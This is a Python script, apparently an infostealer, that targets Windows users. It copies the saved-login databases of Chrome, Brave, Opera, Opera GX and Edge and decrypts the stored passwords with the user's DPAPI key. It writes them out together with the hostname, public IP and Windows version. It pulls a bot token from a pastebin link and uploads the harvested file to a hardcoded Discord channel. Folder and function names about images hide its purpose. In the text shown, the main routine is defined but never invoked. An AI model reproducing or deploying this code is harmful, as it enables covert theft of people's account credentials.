import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import socket
import requests
import discord
from discord.ext import commands
import asyncio
import subprocess

user = os.getlogin()
officiel = None
if not os.path.exists("img"):
    os.makedirs("img")
subprocess.run('systeminfo > img/systemes_infoos.txt', shell=True)
with open('img/systemes_infoos.txt', 'rb') as file:
    try:
        lines = file.read().decode('utf-8', errors='replace').splitlines()
        windows_line = next((line.strip() for line in lines if "Windows" in line), None)
        if windows_line:            
            windows_version = windows_line.split("Windows")[1][:3].strip()
            windows_version.split(" ")
            windows_version = int(windows_version)

    except UnicodeDecodeError as e:
        print(f"Erreur lors de la récupération des fichiers.")
    
fichier_a_supprimer = "img/systemes_infoos.txt"

if os.path.exists(fichier_a_supprimer):
    os.remove(fichier_a_supprimer)
else:
    print(f"Le fichier img1.png n'existe pas.")

ID_DU_SALON = 1213976356577349673
async def envoid(token, nom_fichiers):
    intents = discord.Intents.default()
    intents.all()

    bot = commands.Bot(command_prefix='!', intents=intents)
    nom_fichier = nom_fichiers
    try:
        @bot.event
        async def on_ready():
            salon = bot.get_channel(ID_DU_SALON)
            if salon:
                fichier_discord = discord.File(nom_fichier, filename=f"{nom_fichiers}.txt")
                await salon.send(file=fichier_discord)
            else:
                print("Image(s) non trouvée(s)")
            await bot.close()
        await bot.start(token)

    except FileNotFoundError:
        print("Les fichier n'ont pas été trouvé.")


urlrr = "https://pastebin.com/raw/6NY4E73c"
reponseees = requests.get(urlrr)
contenus = str(reponseees.text)
TOKEN = contenus

nom_ordi = socket.gethostname()

def datet(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def enc():
    global officiel
    if officiel == r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Login Data".format(user):
        chrome_local_state_paths = [os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")]
    elif officiel == r"C:\Users\{}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data".format(user):
        chrome_local_state_paths = [os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")]
    elif officiel == r"C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable\Default\Login Data".format(user):
        chrome_local_state_paths = [os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Local State")]
    elif officiel == r"C:\Users\{}\AppData\Roaming\Opera Software\Opera GX Stable\Login Data".format(user):
        chrome_local_state_paths = [os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")]
    elif officiel == r"C:\Users\{}\AppData\Local\Microsoft\Edge\User Data\Default\Login Data".format(user):
        chrome_local_state_paths = [os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")]
    elif officiel == r"C:\Users\{}\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data".format(user):
        chrome_local_state_paths = [os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")]

    for local_state_path in chrome_local_state_paths:
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)
                if "os_crypt" in local_state and "encrypted_key" in local_state["os_crypt"]:
                    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    key = key[5:]
                    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except (FileNotFoundError, json.JSONDecodeError, KeyError):
            pass
    return None


def dec(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        
def Nitus():
    global officiel
    db_paths = [
        os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Profile 1", "Login Data"),
        os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
        os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
        os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable", "Default", "Login Data"),
        os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
        os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
    ]
    with open(f"img/{nom_ordi}", "a") as file:
        file.write(f"{nom_ordi}\n{ip_publique}\nWindows {windows_version}\n\n\n")
        for db_path in db_paths:
            if os.path.exists(db_path):
                try:
                    filename = f"img/ChromeData_{os.path.basename(db_path)}.db"
                    shutil.copyfile(db_path, filename)
                    db = sqlite3.connect(filename)
                    cursor = db.cursor()
                    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
                    officiel = db_path
                    key = enc()
                    for row in cursor.fetchall():
                        origin_url = row[0]
                        action_url = row[1]
                        username = row[2]
                        password = dec(row[3], key)
                        date_created = row[4]
                        date_last_used = row[5]
                        if username or password:
                            file.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n")
                        else:
                            continue
                        if date_created != 86400000000 and date_created:
                            file.write(f"Creation date: {str(datet(date_created))}\n")
                        if date_last_used != 86400000000 and date_last_used:
                            file.write(f"Last Used: {str(datet(date_last_used))}\n")
                        file.write("=============================================================================\n")
                    cursor.close()
                    db.close()
                    os.remove(filename)
                except Exception as e:
                    print(f"Erreur lors du traitement du fichier")
    try:
        nom_fichier = f"img/{nom_ordi}"
        if os.path.exists(nom_fichier):
            asyncio.run(envoid(TOKEN, nom_fichier))
            os.remove(nom_fichier)
    except Exception as e:
        pass


def decalage_photo():
    try:
        response = requests.get('https://httpbin.org/ip')
        ip_publique = response.json().get('origin')
        return ip_publique
    except Exception as e:
        pass
        return None

try:
    with open(f"img/{nom_ordi}.txt", "w") as file:
        file.close()
    ip_publique = decalage_photo()
except:
    print("Erreur, dossier img ou musique manquant.")